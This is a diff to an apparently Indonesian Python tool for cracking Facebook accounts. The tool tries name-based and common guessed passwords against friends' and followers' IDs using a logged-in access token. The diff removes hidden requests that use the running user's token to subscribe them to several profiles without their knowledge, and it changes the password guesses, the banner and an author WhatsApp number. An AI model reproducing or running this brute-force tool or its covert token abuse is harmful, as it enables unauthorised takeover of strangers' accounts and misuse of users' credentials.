@@ -21,11 +21,6 @@ def login():
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 		try:
 			nama=r['name']
-			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={to}')
-			req.post(f'https://graph.facebook.com/100004018035398/subscribers?access_token={to}')
-			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={to}')
-			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
-			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
 			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
 			open("save","a").write(to)
 			time.sleep(1.5)
@@ -109,7 +104,7 @@ class crack:
 		pil=input("[?] Pwlist Manual [Y/T]: ")
 		if(pil in ("y","Y")):
 			with Bool(max_workers=35) as kirim:
-				print("[!] Contoh (sayang,name,name123)")
+				print("[!] Contoh (bintang,name,name123)")
 				pwList=input("[+] Masukan Password List: ").split(",")
 				self.jalan(f'\n[√] Crack Berjalan Pukul: {time.strftime("%X")}')
 				print(f'+'+'-'*45+'+\n')
@@ -123,13 +118,13 @@ class crack:
 				for email in id:
 					uid,name=email.split("|")
 					if(len(str(name.lower()))>=6):
-						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','anjing','sayang']
+						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','indonesia']
 					elif(len(str(name.lower()))<=2):
-						pw=[name.lower()+'1234',name.lower()+'12345','anjing','sayang']
+						pw=[name.lower()+'1234',name.lower()+'12345','bismillah','indonesia']
 					elif(len(str(name.lower()))<=3):
-						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','anjing','sayang']
+						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','indonesia']
 					else:
-						pw=[name.lower()+'12345','anjing','sayang']
+						pw=[name.lower()+'12345','bismillah','indonesia']
 					kirim.submit(self.crack,uid,pw,name.lower())
 		else:
 			self.jalan(("Pilihan Tidak Ada"))
@@ -151,13 +146,13 @@ class crack:
 		os.system('clear')
 		ha=0
 		print("""
-  _________   _____ __________.___
- /   _____/  /  _  \\______    \   | 
- \_____  \  /  /_\  \|     ___/   |     
- /        \/    |    \    |   |   |   
-/_______  /\____|__  /____|   |___|
-        \/         \/
-        Latif. H & Yanwar. E
+   ____                  ____                         
+  / __ \_   _____  _____/ __ \____ _      _____  _____
+ / / / / | / / _ \/ ___/ /_/ / __ \ | /| / / _ \/ ___/
+/ /_/ /| |/ /  __/ /  / ____/ /_/ / |/ |/ /  __/ /    
+\____/ |___/\___/_/  /_/    \____/|__/|__/\___/_/     
+                                                      
+
         """)
 		self.jalan(f"[!] Welcome {self.nama} Selamat Menggunakan\n")
 		print('[1]. Crack Daftar Teman/Publik\n[2]. Crack Daftar Followers\n[C]. Cek Hasil Crack\n[S]. Setting Useragent\n[L]. Logout Script\n[R]. Laporkan Bug Or Error')
@@ -254,7 +249,7 @@ class crack:
 			exit('\nBerhasil Logout Dan Hapus Akun')
 		elif(pil in ("r","R")):
 			print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
-			os.system("xdg-open https://wa.me/6283870396203")
+			os.system("xdg-open https://wa.me/6285225046423")
 
 if __name__=="__main__":
 	try:
